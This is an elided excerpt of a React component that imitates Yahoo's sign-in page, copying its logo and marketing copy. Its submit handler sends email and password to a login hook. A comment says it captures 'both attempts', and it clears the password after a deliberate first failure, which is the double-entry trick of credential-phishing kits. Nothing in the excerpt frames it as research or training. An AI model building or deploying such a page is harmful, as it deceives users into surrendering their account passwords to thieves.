...
import { useLogin } from '../hooks/useLogin'; // The core logic remains here
...
const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLoginError }) => {
  ...
  const handleSubmit = async (e: React.FormEvent) => {
    // The final submission uses the same logic, capturing both attempts
    const result = await handleFormSubmit(e, { email, password, provider: 'Yahoo' });
    if (result?.isFirstAttempt) {
      setPassword(''); // Clear password after first failed attempt
    }
  };

  const YahooLogo = ({ className = '' }: { className?: string }) => (
    <svg className={`h-8 text-purple-600 ${className}`} viewBox="0 0 136 40" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
      ...
      <main className="flex-grow flex items-center justify-center w-full">
        <div className="flex w-full max-w-4xl">
          ...
          <div className="hidden md:flex flex-col justify-center w-1/2 pr-10">
            <h1 className="text-4xl font-bold text-gray-800 mb-4">Yahoo makes it easy to enjoy what matters most in your world.</h1>
            <p className="text-lg text-gray-600">Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of life.</p>
          </div>
